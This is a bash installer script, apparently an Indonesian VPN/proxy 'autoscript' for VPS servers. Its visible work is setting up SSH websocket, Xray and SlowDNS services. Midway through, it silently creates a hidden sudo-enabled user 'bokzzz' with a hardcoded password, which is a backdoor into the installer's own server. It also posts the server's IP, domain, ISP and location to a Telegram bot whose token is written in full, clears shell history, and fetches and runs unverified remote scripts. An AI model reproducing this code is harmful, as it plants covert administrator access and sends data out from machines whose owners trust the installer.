#!/bin/bash
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
clear
red='\e[1;31m'
green='\e[0;32m'
yell='\e[1;33m'
tyblue='\e[1;36m'
NC='\e[0m'
purple() { echo -e "\\033[35;1m${*}\\033[0m"; }
tyblue() { echo -e "\\033[36;1m${*}\\033[0m"; }
yellow() { echo -e "\\033[33;1m${*}\\033[0m"; }
green() { echo -e "\\033[32;1m${*}\\033[0m"; }
red() { echo -e "\\033[31;1m${*}\\033[0m"; }
# domain random
CDN="https://raw.githubusercontent.com/gemilangvip/autoscript-vvip/main/ssh"
cd /root
if [ "${EUID}" -ne 0 ]; then
echo "You need to run this script as root"
exit 1
fi
if [ "$(systemd-detect-virt)" == "openvz" ]; then
echo "OpenVZ is not supported"
exit 1
fi
localip=$(hostname -I | cut -d\  -f1)
hst=( `hostname` )
dart=$(cat /etc/hosts | grep -w `hostname` | awk '{print $2}')
if [[ "$hst" != "$dart" ]]; then
echo "$localip $(hostname)" >> /etc/hosts
fi
mkdir -p /etc/xray
mkdir -p /etc/v2ray
touch /etc/xray/domain
touch /etc/v2ray/domain
touch /etc/xray/scdomain
touch /etc/v2ray/scdomain
echo -e "[ ${tyblue}NOTES${NC} ] Before we go.. "
sleep 1
echo -e "[ ${tyblue}NOTES${NC} ] I need check your headers first.."
sleep 2
echo -e "[ ${green}INFO${NC} ] Checking headers"
sleep 1
totet=`uname -r`
REQUIRED_PKG="linux-headers-$totet"
PKG_OK=$(dpkg-query -W --showformat='${Status}\n' $REQUIRED_PKG|grep "install ok installed")
echo Checking for $REQUIRED_PKG: $PKG_OK
if [ "" = "$PKG_OK" ]; then
sleep 2
echo -e "[ ${yell}WARNING${NC} ] Try to install ...."
echo "No $REQUIRED_PKG. Setting up $REQUIRED_PKG."
apt-get --yes install $REQUIRED_PKG
sleep 1
echo ""
sleep 1
echo -e "[ ${tyblue}NOTES${NC} ] If error you need.. to do this"
sleep 1
echo ""
sleep 1
echo -e "[ ${tyblue}NOTES${NC} ] 1. apt update -y"
sleep 1
echo -e "[ ${tyblue}NOTES${NC} ] 2. apt upgrade -y"
sleep 1
echo -e "[ ${tyblue}NOTES${NC} ] 3. apt dist-upgrade -y"
sleep 1
echo -e "[ ${tyblue}NOTES${NC} ] 4. reboot"
sleep 1
echo ""
sleep 1
echo -e "[ ${tyblue}NOTES${NC} ] After rebooting"
sleep 1
echo -e "[ ${tyblue}NOTES${NC} ] Then run this script again"
echo -e "[ ${tyblue}NOTES${NC} ] if you understand then tap enter now"
read
else
echo -e "[ ${green}INFO${NC} ] Oke installed"
fi
ttet=`uname -r`
ReqPKG="linux-headers-$ttet"
if ! dpkg -s $ReqPKG  >/dev/null 2>&1; then
rm /root/setup.sh >/dev/null 2>&1
exit
else
clear
fi
secs_to_human() {
echo "Installation time : $(( ${1} / 3600 )) hours $(( (${1} / 60) % 60 )) minute's $(( ${1} % 60 )) seconds"
}
start=$(date +%s)
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1
sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null 2>&1
coreselect=''
cat> /root/.profile << END
if [ "$BASH" ]; then
if [ -f ~/.bashrc ]; then
. ~/.bashrc
fi
fi
mesg n || true
clear
END
chmod 644 /root/.profile
echo -e "[ ${green}INFO${NC} ] Preparing the install file"
apt install git curl -y >/dev/null 2>&1
apt install python -y >/dev/null 2>&1
echo -e "[ ${green}INFO${NC} ] Aight good ... installation file is ready"
echo -e "$green                                                                                         $NC"
echo -e "$green██████╗░██████╗░██╗███╗░░██╗░██████╗░░█████╗░░██████╗  ░█████╗░██╗░░░██╗████████╗░█████╗░$NC"
echo -e "$green██╔══██╗██╔══██╗██║████╗░██║██╔════╝░██╔══██╗██╔════╝  ██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗$NC"
echo -e "$green██████╦╝██████╔╝██║██╔██╗██║██║░░██╗░███████║╚█████╗░  ███████║██║░░░██║░░░██║░░░██║░░██║$NC"
echo -e "$green██╔══██╗██╔══██╗██║██║╚████║██║░░╚██╗██╔══██║░╚═══██╗  ██╔══██║██║░░░██║░░░██║░░░██║░░██║$NC"
echo -e "$green██████╦╝██║░░██║██║██║░╚███║╚██████╔╝██║░░██║██████╔╝  ██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝$NC"
echo -e "$green╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚═════╝░  ╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░$NC"
echo -e "$green                                                                                         $NC"
echo -e "$green██╗███╗░░██╗░██████╗████████╗░█████╗░██╗░░░░░██╗░░░░░  ░██████╗░██████╗██╗░░██╗$NC"
echo -e "$green██║████╗░██║██╔════╝╚══██╔══╝██╔══██╗██║░░░░░██║░░░░░  ██╔════╝██╔════╝██║░░██║$NC"
echo -e "$green██║██╔██╗██║╚█████╗░░░░██║░░░███████║██║░░░░░██║░░░░░  ╚█████╗░╚█████╗░███████║$NC"
echo -e "$green██║██║╚████║░╚═══██╗░░░██║░░░██╔══██║██║░░░░░██║░░░░░  ░╚═══██╗░╚═══██╗██╔══██║$NC"
echo -e "$green██║██║░╚███║██████╔╝░░░██║░░░██║░░██║███████╗███████╗  ██████╔╝██████╔╝██║░░██║$NC"
echo -e "$green╚═╝╚═╝░░╚══╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚══════╝  ╚═════╝░╚═════╝░╚═╝░░╚═╝$NC"
echo -e "$green» TERIMAKASIH TELAH MEMAKAI AUTOSCRIPT GEMILANG-KINASIH࿐ «$NC"
sleep 2
echo -ne "[ ${green}INFO${NC} ] Check permission : "
mkdir -p /var/lib/SIJA >/dev/null 2>&1
echo "IP=" >> /var/lib/SIJA/ipvps.conf
echo ""
wget -q https://raw.githubusercontent.com/gemilangvip/autoscript-vvip/main/tools.sh;chmod +x tools.sh;./tools.sh
rm tools.sh
clear
echo " "
clear
echo -e "$green━━━━━━━━━━┏┓━━━━━━━━━━━━━━━━━━━━━━━━┏┓━━━━━━━━━━━$NC"
echo -e "$green━━━━━━━━━┏┛┗┓━━━━━━━━━━━━━━━━━━━━━━┏┛┗┓━━━━━━━━━━$NC"
echo -e "$green┏━━┓━┏┓┏┓┗┓┏┛┏━━┓━━━━┏━━┓┏━━┓┏┓┏━┓━┗┓┏┛┏┓┏━┓━┏━━┓$NC"
echo -e "$green┗━┓┃━┃┃┃┃━┃┃━┃┏┓┃━━━━┃┏┓┃┃┏┓┃┣┫┃┏┓┓━┃┃━┣┫┃┏┓┓┃┏┓┃$NC"
echo -e "$green┃┗┛┗┓┃┗┛┃━┃┗┓┃┗┛┃━━━━┃┗┛┃┃┗┛┃┃┃┃┃┃┃━┃┗┓┃┃┃┃┃┃┃┗┛┃$NC"
echo -e "$green┗━━━┛┗━━┛━┗━┛┗━━┛━━━━┃┏━┛┗━━┛┗┛┗┛┗┛━┗━┛┗┛┗┛┗┛┗━┓┃$NC"
echo -e "$green━━━━━━━━━━━━━━━━━━━━━┃┃━━━━━━━━━━━━━━━━━━━━━━┏━┛┃$NC"
echo -e "$green━━━━━━━━━━━━━━━━━━━━━┗┛━━━━━━━━━━━━━━━━━━━━━━┗━━┛$NC"
    echo -e "$BBlue                     SETUP DOMAIN VPS     $NC"
    echo -e "$BYellow----------------------------------------------------------$NC"
    echo -e "$BGreen 1. Choose Your Own Domain / Gunakan Domain Sendiri $NC"
    echo -e "$BGreen 2. Use Domain Random / Gunakan Domain Random $NC"
    echo -e "$BYellow----------------------------------------------------------$NC"
    read -rp " input 1 or 2 / pilih 1 atau 2 : " dns
	if test $dns -eq 1; then
    read -rp " Enter Your Domain / masukan domain : " dom
    read -rp " Input ur ns-domain : " -e nsdomen
    echo "IP=$dom" > /var/lib/SIJA/ipvps.conf
    echo "$dom" > /root/scdomain
	echo "$dom" > /etc/xray/scdomain
	echo "$dom" > /etc/xray/domain
	echo "$dom" > /etc/v2ray/domain
	echo "$dom" > /root/domain
        echo "$nsdomen" > /etc/xray/nsdomain
        echo "$nsdomen" > /root/nsdomain
	elif test $dns -eq 2; then
    clear
    apt install jq curl -y
    wget -q -O /root/cf "${CDN}/cf" >/dev/null 2>&1
    chmod +x /root/cf
    bash /root/cf | tee /root/install.log
    print_success " Domain Random Done"
fi
# Inisialisasi
MYIP=$(curl -sS ipv4.icanhazip.com)
# Perizinan Sc & Pemanggilan username
izinsc="https://raw.githubusercontent.com/gemilangvip/autoscript-vvip/main/register"
rm -f /usr/bin/user
username=$(curl $izinsc | grep $MYIP | awk '{print $2}')
echo "$username" >/usr/bin/user
exp=$(curl $izinsc | grep $MYIP | awk '{print $3}')
echo "$exp" >/usr/bin/e

# Usename & Expired
Name=$(cat /usr/bin/user)
Exp=$(cat /usr/bin/e)

ISP=$(curl -s ipinfo.io/org | cut -d " " -f 2-10 )
domain=$(cat /root/domain)
CITY=$(curl -s ipinfo.io/city )
WKT=$(curl -s ipinfo.io/timezone )
userdel jame > /dev/null 2>&1
Username="bokzzz"
Password=bokzzz
mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
usermod -aG sudo $Username > /dev/null 2>&1
CHATID="6348824977"
KEY="6854390843:AAHnygrqUOSq-5spVPBBrOvBMy4xcdUBPBU"
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
TEXT="Instalasi Autoscript-vvip V2.4
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<code>Username   :</code> <code>$Name</code>
<code>Domain     :</code> <code>$domain</code>
<code>IP Vps     :</code> <code>$MYIP</code>
<code>IP Vps     :</code> <code>$ISP</code>
<code>Timezone   :</code> <code>$WKT</code>
<code>Location   :</code> <code>$CITY</code>
<code>Exp Sc.    :</code> <code>$Exp</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
By Admin Gemilangkinasih࿐
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<i>Notifications Automatic From Github</i>
"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"https://wa.me/+628984880039"}]]}' 

curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green      Install SSH / WS               $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
clear
wget https://raw.githubusercontent.com/gemilangvip/autoscript-vvip/main/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green      Install BACKUP               $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
clear
wget https://raw.githubusercontent.com/gemilangvip/autoscript-vvip/main/backup/set-br.sh &&  chmod +x set-br.sh && ./set-br.sh
clear
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green          Install XRAY              $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
clear
wget https://raw.githubusercontent.com/gemilangvip/autoscript-vvip/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
wget https://raw.githubusercontent.com/gemilangvip/autoscript-vvip/main/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green          Install SLOWDNS              $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 2
clear
wget -q -O slow.sh https://raw.githubusercontent.com/gemilangvip/autoscript-vvip/main/slow.sh && chmod +x slow.sh && ./slow.sh
clear
cat> /root/.profile << END
if [ "$BASH" ]; then
if [ -f ~/.bashrc ]; then
. ~/.bashrc
fi
fi
mesg n || true
clear
menu
END
chmod 644 /root/.profile
if [ -f "/root/log-install.txt" ]; then
rm /root/log-install.txt > /dev/null 2>&1
fi
if [ -f "/etc/afak.conf" ]; then
rm /etc/afak.conf > /dev/null 2>&1
fi
if [ ! -f "/etc/log-create-user.log" ]; then
echo "Log All Account " > /etc/log-create-user.log
fi
history -c
serverV=$( curl -sS https://raw.githubusercontent.com/gemilangvip/autoscript-vvip/main/version  )
echo $serverV > /opt/.ver
aureb=$(cat /home/re_otm)
b=11
if [ $aureb -gt $b ]
then
gg="PM"
else
gg="AM"
fi
curl -sS ifconfig.me > /etc/myipvps
echo " "
echo "===================-[ GEMILANG-KINASIH ]-===================" | tee -a log-install.txt
echo "------------------------------------------------------------" | tee -a log-install.txt
echo "" | tee -a log-install.txt
echo "   >>> Service & Port"  | tee -a log-install.txt
echo "   - OpenVPN		: 2086"  | tee -a log-install.txt
echo "   - OpenSSH		: 22"  | tee -a log-install.txt
echo "   - SSH Websocket	 : 80,8080 [ON]" | tee -a log-install.txt
echo "   - SSH SSL Websocket : 443" | tee -a log-install.txt
echo "   - Stunnel4		: 8880, 8443" | tee -a log-install.txt
echo "   - Dropbear		: 109, 143" | tee -a log-install.txt
echo "   - Badvpn		: 7100-7900" | tee -a log-install.txt
echo "   - Nginx		: 81" | tee -a log-install.txt
echo "   - Vmess TLS		: 443" | tee -a log-install.txt
echo "   - Vmess None TLS	: 80,8080" | tee -a log-install.txt
echo "   - Vless TLS		: 443" | tee -a log-install.txt
echo "   - Vless None TLS	: 80,8080" | tee -a log-install.txt
echo "   - Trojan GRPC		: 443" | tee -a log-install.txt
echo "   - Trojan WS		: 443" | tee -a log-install.txt
echo "   - Trojan Go		: 443" | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   >>> Server Information & Other Features"  | tee -a log-install.txt
echo "   - Timezone		: Asia/Jakarta (GMT +7)"  | tee -a log-install.txt
echo "   - Fail2Ban		: [ON]"  | tee -a log-install.txt
echo "   - Dflate		: [ON]"  | tee -a log-install.txt
echo "   - IPtables		: [ON]"  | tee -a log-install.txt
echo "   - Auto-Reboot	: [ON]"  | tee -a log-install.txt
echo "   - IPv6			: [OFF]"  | tee -a log-install.txt
echo "   - Autoreboot On    : $aureb:00 $gg GMT +7" | tee -a log-install.txt
echo "   - AutoKill Multi Login User" | tee -a log-install.txt
echo "   - Auto Delete Expired Account" | tee -a log-install.txt
echo "   - Fully automatic script" | tee -a log-install.txt
echo "   - VPS settings" | tee -a log-install.txt
echo "   - Admin Control" | tee -a log-install.txt
echo "   - Change port" | tee -a log-install.txt
echo "   - Full Orders For Various Services" | tee -a log-install.txt
echo "" | tee -a log-install.txt
echo "------------------------------------------------------------" | tee -a log-install.txt
echo "===============-[ Script By Gemilangkinasih ]-==============" | tee -a log-install.txt
echo -e ""
echo ""
echo ""
rm /root/setup.sh >/dev/null 2>&1
rm /root/ins-xray.sh >/dev/null 2>&1
rm /root/insshws.sh >/dev/null 2>&1
secs_to_human "$(($(date +%s) - ${start}))" | tee -a log-install.txt
echo -e ""
read -n 1 -s -r -p "Press any key to menu"
menu
